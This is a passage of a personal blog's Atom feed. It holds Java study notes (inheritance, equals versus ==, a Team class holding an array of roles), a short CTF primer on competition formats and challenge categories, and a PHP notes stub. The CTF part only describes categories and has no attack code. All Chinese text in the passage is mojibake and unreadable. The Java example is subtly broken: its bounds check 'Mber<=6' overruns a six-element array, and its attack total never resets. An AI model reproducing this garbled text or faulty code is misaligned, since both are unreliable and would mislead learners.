    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ä¸€ã€ç»§æ‰¿"><a href="#ä¸€ã€ç»§æ‰¿" class="headerlink" title="ä¸€ã€ç»§æ‰¿"></a>ä¸€ã€ç»§æ‰¿</h1><h2 id="æŠ½è±¡ç±»-æ–¹æ³•ï¼šabstractå…³é”®å­—ä¿®é¥°"><a href="#æŠ½è±¡ç±»-æ–¹æ³•ï¼šabstractå…³é”®å­—ä¿®é¥°" class="headerlink" title="æŠ½è±¡ç±»/æ–¹æ³•ï¼šabstractå…³é”®å­—ä¿®é¥°"></a>æŠ½è±¡ç±»/æ–¹æ³•ï¼šabstractå…³é”®å­—ä¿®é¥°</h2><p><a href="https://blog.csdn.net/weixin_40096176/article/details/79094991?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164835079316782089352133%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164835079316782089352133&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-79094991.142%5Ev5%5Epc_search_result_control_group,143%5Ev6%5Econtrol&utm_term=abstract%E5%85%B3%E9%94%AE%E5%AD%97&spm=1018.2226.3001.4187">javaå…³é”®å­—abstract(æŠ½è±¡)è¯¦è§£</a></p><p>ç®€å•ç†è§£ä¸‹ï¼šabstractå…³é”®å­—ä¿®é¥°çš„ç±»/æ–¹æ³•,åªèƒ½è¢« ç»§æ‰¿ã€è¦†å†™/è¦†å†™  åæ‰èƒ½å®ä¾‹</p><h2 id="ä¸Šè½¬å‹å¯¹è±¡"><a href="#ä¸Šè½¬å‹å¯¹è±¡" class="headerlink" title="ä¸Šè½¬å‹å¯¹è±¡"></a>ä¸Šè½¬å‹å¯¹è±¡</h2><p>çˆ¶ç±» åç§° = new å­ç±»()<br><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054596.png"></p><h2 id="equalså’Œ-çš„åŒºåˆ«"><a href="#equalså’Œ-çš„åŒºåˆ«" class="headerlink" title="equalså’Œ==çš„åŒºåˆ«"></a>equalså’Œ==çš„åŒºåˆ«</h2><p><strong>åŒç­‰å·æ¯”è¾ƒçš„å…¶å®æ˜¯åœ°å€å€¼</strong></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202204032054212.png"></p><p>åœ¨ç¼–è¯‘String s1=â€œsongâ€çš„æ—¶å€™å…¶å®æ˜¯jvmåœ¨å¸¸é‡æ± ä¸­åˆ›å»ºäº†ä¸€ä¸ªå†…å®¹ä¸ºâ€songâ€çš„åœ°å€å€¼,ç„¶åè®©s1å»æŒ‡å‘â€songâ€,è€Œä¸æ˜¯æŠŠâ€songâ€ç›´æ¥èµ‹å€¼ç»™s1;</p><p>åœ¨ç¼–è¯‘String s2=â€œsongâ€çš„æ—¶å€™å¸¸é‡æ± ä¸­å·²ç»æœ‰äº†â€songâ€çš„åœ°å€å€¼,æ‰€ä»¥è®©s2ç›´æ¥æŒ‡å‘å¸¸é‡æ± ä¸­çš„â€songâ€ï¼Œè¿™æ ·s1å’Œs2çš„åœ°å€å€¼éƒ½æ˜¯å¸¸é‡æ± ä¸­â€songâ€çš„åœ°å€å€¼,æ‰€ä»¥é€šè¿‡åŒç­‰å·çš„è¿ç®—ç»“æœæ˜¯trueã€‚</p><p><strong>equalsæ¯”è¾ƒçš„æ˜¯å†…å®¹æ˜¯å¦ç›¸åŒ</strong></p><p>ç„¶è€Œåœ¨ç¬¬äºŒç§æƒ…å†µä¸‹æ‰§è¡ŒString s2=new String(â€œsongâ€)çš„æ—¶å€™,è¦è®°ä½æ¯newä¸€æ¬¡å°±ä¼šå‡ºç°ä¸€ä¸ªæ–°çš„å¯¹è±¡,æ‰€ä»¥è¿™ç§æƒ…å†µæ˜¯ç›´æ¥åœ¨å †å†…å­˜ä¸­å¼€è¾Ÿäº†ä¸€å—æ–°çš„ç©ºé—´å»å‚¨å­˜â€songâ€,æ‰€ä»¥æ­¤æ—¶s1å’Œs2çš„åœ°å€å€¼æ˜¯ä¸ä¸€æ ·çš„,è‡ªç„¶==çš„ç»“æœå°±ä¸ºfalseã€‚</p><p><img src="https://gitee.com/kannikanyun/kan-yun/raw/master/img/202203261825091.png"></p><h1 id="äºŒã€privateå…³é”®å­—"><a href="#äºŒã€privateå…³é”®å­—" class="headerlink" title="äºŒã€privateå…³é”®å­—"></a>äºŒã€privateå…³é”®å­—</h1><p>çˆ¶ç±»è¢«å­ç±»ç»§æ‰¿åï¼Œå…¶privateä¿®é¥°çš„å±æ€§ï¼Œåªèƒ½é€šè¿‡çˆ¶ç±»çš„å…¬æœ‰æ–¹æ³•èµ‹å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šprivateä¿®é¥°å±æ€§åœ¨æ„é€ æ–¹æ³•æ—¶ä¸å¿…ç›´æ¥èµ‹å€¼ï¼Œå¯ä»¥åœ¨å­ç±»ç»§æ‰¿åé€šè¿‡é€šè¿‡publicæ–¹æ³•è¿›é¡¹èµ‹å€¼</p><h1 id="ä¸‰ã€â€™ç±»â€™-å‹çš„æ•°ç»„"><a href="#ä¸‰ã€â€™ç±»â€™-å‹çš„æ•°ç»„" class="headerlink" title="ä¸‰ã€â€™ç±»â€™  å‹çš„æ•°ç»„"></a>ä¸‰ã€â€™ç±»â€™  å‹çš„æ•°ç»„</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Team</span> <span class="token punctuation">&#123;</span><span class="token comment">// æ¯æ¬¡è°ƒç”¨è¡¨ç¤ºç»„é˜Ÿå¢åŠ ä¸€ä¸ªæˆå‘˜</span> <span class="token class-name">Role</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> mber <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Role</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token class-name">Mber</span> <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//è§’è‰²ä¸Šé™ä¸º6äºº</span> <span class="token keyword">int</span> sumAttack<span class="token punctuation">;</span>  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addMember</span><span class="token punctuation">(</span><span class="token class-name">Role</span> role<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Mber</span><span class="token operator">&lt;=</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>mber<span class="token punctuation">[</span><span class="token class-name">Mber</span><span class="token punctuation">]</span> <span class="token operator">=</span> role<span class="token punctuation">;</span><span class="token class-name">Mber</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ç»„é˜Ÿäººæ•°è¶…è¿‡ä¸Šé™"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">attackSum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token class-name">Mber</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sumAttack <span class="token operator">+=</span> mber<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> sumAttack<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><center>æ­¤ç±»æ•°ç»„èµ‹å€¼æ—¶ï¼Œæ–¹æ³•ä¸­å‘æ•°ç»„ä¼ å‚çš„å€¼ä¸ºçˆ¶ç±»æˆ–å­ç±»çš„å®ä¾‹åŒ–å¯¹è±¡</center>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="JAVA" scheme="https://kannikanyun.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>CtfhubDay1</title>
    <link href="https://kannikanyun.github.io/2022/03/24/CtfhubDay1/"/>
    <id>https://kannikanyun.github.io/2022/03/24/CtfhubDay1/</id>
    <published>2022-03-24T13:52:12.000Z</published>
    <updated>2022-03-26T13:38:46.730Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CTFåŸºç¡€çŸ¥è¯†"><a href="#CTFåŸºç¡€çŸ¥è¯†" class="headerlink" title="CTFåŸºç¡€çŸ¥è¯†"></a>CTFåŸºç¡€çŸ¥è¯†</h1><h2 id="æ¯”èµ›å½¢å¼"><a href="#æ¯”èµ›å½¢å¼" class="headerlink" title="æ¯”èµ›å½¢å¼"></a>æ¯”èµ›å½¢å¼</h2><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>CTFæ¯”èµ›ä¸€èˆ¬åˆ†ä¸ºçº¿ä¸Šèµ›å’Œçº¿ä¸‹èµ›ã€‚é€šå¸¸æ¥è¯´ï¼Œçº¿ä¸Šèµ›å¤šä¸º<code>åˆèµ›</code>, çº¿ä¸‹èµ›å¤šä¸º<code>å†³èµ›</code>, ä½†æ˜¯ä¹Ÿä¸æ’é™¤ç›´æ¥è¿›è¡Œ</p><h3 id="çº¿ä¸Š"><a href="#çº¿ä¸Š" class="headerlink" title="çº¿ä¸Š"></a>çº¿ä¸Š</h3><p>é€‰æ‰‹é€šè¿‡ä¸»åŠæ–¹æ­å»ºçš„æ¯”èµ›å¹³å°åœ¨çº¿æ³¨å†Œï¼Œåœ¨çº¿åšé¢˜å¹¶æäº¤flagï¼Œçº¿ä¸Šæ¯”èµ›å¤šä¸ºè§£é¢˜æ¨¡å¼ï¼Œæ”»é˜²æ¨¡å¼è¾ƒä¸ºå°‘è§ã€‚é€šå¸¸æ¥è¯´å¯¹äºé•¿æ—¶é—´æœªè§£å‡ºçš„é¢˜ç›®ï¼Œä¸»åŠæ–¹ä¼šé…Œæƒ…ç»™å‡ºæç¤º(<code>Hint</code>)æ¥å¸®åŠ©é€‰æ‰‹åšé¢˜ã€‚</p><h3 id="çº¿ä¸‹"><a href="#çº¿ä¸‹" class="headerlink" title="çº¿ä¸‹"></a>çº¿ä¸‹</h3><p>é€‰æ‰‹å‰å¾€æ¯”èµ›æ‰€åœ¨åœ°ï¼Œç°åœºæ¥å…¥æ¯”èµ›ç½‘ç»œè¿›è¡Œæ¯”èµ›ï¼Œçº¿ä¸‹å¤šä¸ºAWDæ¨¡å¼ï¼Œè¿‘å¹´æ¥éšç€æ¯”èµ›èµ›åˆ¶çš„ä¸æ–­é©æ–°ï¼Œçº¿ä¸‹èµ›ä¹Ÿä¼šå‡ºç°å¤šç§æ¨¡å¼æ··åˆè¿›è¡Œï¼Œä¾‹å¦‚ç»“åˆ<strong>è§£é¢˜+AWD</strong> ï¼Œ<strong>è§£é¢˜+RW</strong> ç­‰ç­‰   </p><h2 id="é¢˜ç›®ç±»å‹"><a href="#é¢˜ç›®ç±»å‹" class="headerlink" title="é¢˜ç›®ç±»å‹"></a>é¢˜ç›®ç±»å‹</h2><h2 id="æ­£æ–‡-1"><a href="#æ­£æ–‡-1" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>åœ¨CTFä¸­ä¸»è¦åŒ…å«ä»¥ä¸‹5ä¸ªå¤§ç±»çš„é¢˜ç›®ï¼Œæœ‰äº›æ¯”èµ›ä¼šæ ¹æ®è‡ªå·±çš„ä¾§é‡ç‚¹å•ç‹¬æ·»åŠ æŸä¸ªåˆ†ç±»ï¼Œä¾‹å¦‚<code>ç§»åŠ¨è®¾å¤‡(Mobile)</code>, <code>ç”µå­å–è¯(Forensics)</code>ç­‰ï¼Œè¿‘å¹´æ¥ä¹Ÿä¼šå‡ºæ¥æ··åˆç±»å‹çš„é¢˜ç›®ï¼Œä¾‹å¦‚åœ¨Webä¸­å­˜åœ¨ä¸€ä¸ªäºŒè¿›åˆ¶ç¨‹åºï¼Œéœ€è¦é€‰æ‰‹å…ˆåˆ©ç”¨Webçš„æ¼æ´è·å–åˆ°äºŒè¿›åˆ¶ç¨‹åºï¼Œä¹‹åé€šè¿‡é€†å‘æˆ–æ˜¯Pwnç­‰æ–¹å¼è·å¾—æœ€ç»ˆflag</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>Webç±»é¢˜ç›®å¤§éƒ¨åˆ†æƒ…å†µä¸‹å’Œç½‘ã€Webã€HTTPç­‰ç›¸å…³æŠ€èƒ½æœ‰å…³ã€‚ä¸»è¦è€ƒå¯Ÿé€‰æ‰‹å¯¹äºWebæ”»é˜²çš„ä¸€äº›çŸ¥è¯†æŠ€å·§ã€‚è¯¸å¦‚<code>SQLæ³¨å…¥</code>ã€<code>XSS</code>ã€<code>ä»£ç æ‰§è¡Œ</code>ã€<code>ä»£ç å®¡è®¡</code>ç­‰ç­‰éƒ½æ˜¯å¾ˆå¸¸è§çš„è€ƒç‚¹ã€‚ä¸€èˆ¬æƒ…å†µä¸‹Webé¢˜ç›®åªä¼šç»™å‡ºä¸€ä¸ªèƒ½å¤Ÿè®¿é—®çš„URLã€‚éƒ¨åˆ†é¢˜ç›®ä¼šç»™å‡ºé™„ä»¶</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>Pwnç±»é¢˜ç›®é‡ç‚¹è€ƒå¯Ÿé€‰æ‰‹å¯¹äº<code>äºŒè¿›åˆ¶æ¼æ´çš„æŒ–æ˜å’Œåˆ©ç”¨</code>èƒ½åŠ›ï¼Œå…¶è€ƒç‚¹ä¹Ÿé€šå¸¸åœ¨<code>å †æ ˆæº¢å‡º</code>ã€<code>æ ¼å¼åŒ–æ¼æ´</code>ã€<code>UAF</code>ã€<code>Double Free</code>ç­‰å¸¸è§äºŒè¿›åˆ¶æ¼æ´ä¸Šã€‚é€‰æ‰‹éœ€è¦æ ¹æ®é¢˜ç›®ä¸­ç»™å‡ºçš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œé€†å‘åˆ†æï¼Œæ‰¾å‡ºå…¶ä¸­çš„æ¼æ´å¹¶è¿›è¡Œåˆ©ç”¨ï¼Œç¼–å†™å¯¹åº”çš„æ¼æ´æ”»å‡»è„šæœ¬(<code>Exploit</code>)ï¼Œè¿›è€Œå¯¹ä¸»åŠæ–¹ç»™å‡ºçš„è¿œç¨‹æœåŠ¡å™¨è¿›è¡Œæ”»å‡»å¹¶è·å–flagé€šå¸¸æ¥è¯´Pwnç±»é¢˜ç›®ç»™å‡ºçš„è¿œç¨‹æœåŠ¡å™¨ä¿¡æ¯ä¸º<code>nc IP_ADDRESS PORT</code>ï¼Œä¾‹å¦‚<code>nc 1.2.3.4 4567</code>è¿™ç§å½¢å¼ï¼Œè¡¨ç¤ºåœ¨<code>1.2.3.4</code>è¿™ä¸ªIPçš„<code>4567</code>ç«¯å£ä¸Šè¿è¡Œäº†è¯¥é¢˜ç›®</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>Reç±»é¢˜ç›®è€ƒå¯Ÿé€‰æ‰‹<code>é€†å‘å·¥ç¨‹</code>èƒ½åŠ›ã€‚é¢˜ç›®ä¼šç»™å‡ºä¸€ä¸ªå¯æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæœ‰äº›æ—¶å€™ä¹Ÿå¯èƒ½æ˜¯Androidçš„APKå®‰è£…åŒ…ã€‚é€‰æ‰‹éœ€è¦é€†å‘ç»™å‡ºçš„ç¨‹åºï¼Œåˆ†æå…¶ç¨‹åºå·¥ä½œåŸç†ã€‚æœ€ç»ˆæ ¹æ®ç¨‹åºè¡Œä¸ºç­‰è·å¾—flag</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><p>Cryptoç±»é¢˜ç›®è€ƒå¯Ÿé€‰æ‰‹å¯¹<code>å¯†ç å­¦</code>ç›¸å…³çŸ¥è¯†çš„äº†è§£ç¨‹åº¦ï¼Œè¯¸å¦‚<code>RSA</code>ã€<code>AES</code>ã€<code>DES</code>ç­‰éƒ½æ˜¯å¯†ç å­¦é¢˜ç›®çš„å¸¸å®¢ã€‚æœ‰äº›æ—¶å€™ä¹Ÿä¼šç»™å‡ºä¸€ä¸ªåŠ å¯†è„šæœ¬å’Œå¯†æ–‡ï¼Œæ ¹æ®åŠ å¯†æµç¨‹é€†æ¨å‡ºæ˜æ–‡ã€‚</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><p>Miscæ„ä¸ºæ‚é¡¹ï¼Œå³ä¸åŒ…å«åœ¨ä»¥ä¸Šåˆ†ç±»çš„é¢˜ç›®éƒ½ä¼šæ”¾åˆ°è¿™ä¸ªåˆ†ç±»ã€‚é¢˜ç›®ä¼šç»™å‡ºä¸€ä¸ªé™„ä»¶ã€‚é€‰æ‰‹ä¸‹è½½è¯¥é™„ä»¶è¿›è¡Œåˆ†æï¼Œæœ€ç»ˆå¾—å‡ºflag</p><p>å¸¸è§çš„é¢˜å‹æœ‰å›¾ç‰‡éšå†™ã€è§†é¢‘éšå†™ã€æ–‡æ¡£éšå†™ã€æµé‡åˆ†æã€åè®®åˆ†æã€æ¸¸æˆã€IoTç›¸å…³ç­‰ç­‰ã€‚äº”èŠ±å…«é—¨ï¼Œç§ç±»ç¹å¤šã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>PHPå­¦ä¹ ç¬”è®°2</title>
    <link href="https://kannikanyun.github.io/2022/03/23/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
    <id>https://kannikanyun.github.io/2022/03/23/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/</id>
    <published>2022-03-23T13:52:23.000Z</published>
    <updated>2022-03-27T14:18:04.436Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ç¬¬ä¸‰ç« -æµç¨‹æ§åˆ¶"><a href="#ç¬¬ä¸‰ç« -æµç¨‹æ§åˆ¶" class="headerlink" title="ç¬¬ä¸‰ç« _ æµç¨‹æ§åˆ¶"></a>ç¬¬ä¸‰ç« _ æµç¨‹æ§åˆ¶</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="PHP" scheme="https://kannikanyun.github.io/tags/PHP/"/>
    
  </entry>
  
</feed>
